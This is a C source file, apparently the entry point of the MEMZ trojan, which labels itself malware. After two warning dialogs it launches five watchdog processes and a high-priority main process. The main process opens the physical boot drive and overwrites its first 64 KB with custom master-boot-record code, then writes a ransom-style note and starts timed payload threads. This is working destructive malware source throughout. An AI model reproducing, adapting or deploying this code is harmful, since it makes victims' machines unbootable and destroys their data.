#include "../MEMZ.h"

#ifndef CLEAN
void start() {
	int argc;
	LPWSTR *argv = CommandLineToArgvW(GetCommandLineW(), &argc);

	if (argc > 1) {
		if (!lstrcmpW(argv[1], L"/watchdog")) {
			CreateThread(NULL, NULL, &watchdogThread, NULL, NULL, NULL);

			WNDCLASSEXA c;
			c.cbSize = sizeof(WNDCLASSEXA);
			c.lpfnWndProc = watchdogWindowProc;
			c.lpszClassName = "hax";
			c.style = 0;
			c.cbClsExtra = 0;
			c.cbWndExtra = 0;
			c.hInstance = NULL;
			c.hIcon = 0;
			c.hCursor = 0;
			c.hbrBackground = 0;
			c.lpszMenuName = NULL;
			c.hIconSm = 0;

			RegisterClassExA(&c);

			HWND hwnd = CreateWindowExA(0, "hax", NULL, NULL, 0, 0, 100, 100, NULL, NULL, NULL, NULL);

			MSG msg;
			while (GetMessage(&msg, NULL, 0, 0) > 0) {
				TranslateMessage(&msg);
				DispatchMessage(&msg);
			}
		}
	} else {
		// Another very ugly formatting
		if (MessageBoxA(NULL, "The software you just executed is considered malware.\r\n\
This malware will harm your computer and makes it unusable.\r\n\
If you are seeing this message without knowing what you just executed, simply press No and nothing will happen.\r\n\
If you know what this malware does and are using a safe environment to test, \
press Yes to start it.\r\n\r\n\
DO YOU WANT TO EXECUTE THIS MALWARE, RESULTING IN AN UNUSABLE MACHINE?", "MEMZ", MB_YESNO | MB_ICONWARNING) != IDYES ||
MessageBoxA(NULL, "THIS IS THE LAST WARNING!\r\n\r\n\
THE CREATOR IS NOT RESPONSIBLE FOR ANY DAMAGE MADE USING THIS MALWARE!\r\n\
STILL EXECUTE IT?", "MEMZ", MB_YESNO | MB_ICONWARNING) != IDYES) {
			ExitProcess(0);
		}

		wchar_t *fn = (wchar_t *)LocalAlloc(LMEM_ZEROINIT, 8192*2);
		GetModuleFileName(NULL, fn, 8192);

		for (int i = 0; i < 5; i++)
			ShellExecute(NULL, NULL, fn, L"/watchdog", NULL, SW_SHOWDEFAULT);

		SHELLEXECUTEINFO info;
		info.cbSize = sizeof(SHELLEXECUTEINFO);
		info.lpFile = fn;
		info.lpParameters = L"/main";
		info.fMask = SEE_MASK_NOCLOSEPROCESS;
		info.hwnd = NULL;
		info.lpVerb = NULL;
		info.lpDirectory = NULL;
		info.hInstApp = NULL;
		info.nShow = SW_SHOWDEFAULT;

		ShellExecuteEx(&info);

		SetPriorityClass(info.hProcess, HIGH_PRIORITY_CLASS);

		ExitProcess(0);
	}

	HANDLE drive = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);

	if (drive == INVALID_HANDLE_VALUE)
		ExitProcess(2);

	unsigned char *bootcode = (unsigned char *)LocalAlloc(LMEM_ZEROINIT, 65536);

	// Join the two code parts together
	int i = 0;
	for (; i < mbrStage1Len; i++)
		*(bootcode + i) = *(mbrStage1 + i);
	for (i = 0; i < mbrStage2Len; i++)
		*(bootcode + i + 0x1fe) = *(mbrStage2 + i);

	DWORD wb;
	if (!WriteFile(drive, bootcode, 65536, &wb, NULL))
		ExitProcess(3);

	CloseHandle(drive);

	HANDLE note = CreateFileA("\\note.txt", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);

	if (note == INVALID_HANDLE_VALUE)
		ExitProcess(4);

	if (!WriteFile(note, Note, NoteLen, &wb, NULL))
		ExitProcess(5);

	CloseHandle(note);
	ShellExecuteA(NULL, NULL, "notepad", "\\note.txt", NULL, SW_SHOWDEFAULT);

	for (int p = 0; p < nPayloads; p++) {
		Sleep(payloads[p].startDelay);
		CreateThread(NULL, NULL, payloads[p].payloadHost, &payloads[p], NULL, NULL);
	}

	for (;;) {
		Sleep(10000);
	}
}
#endif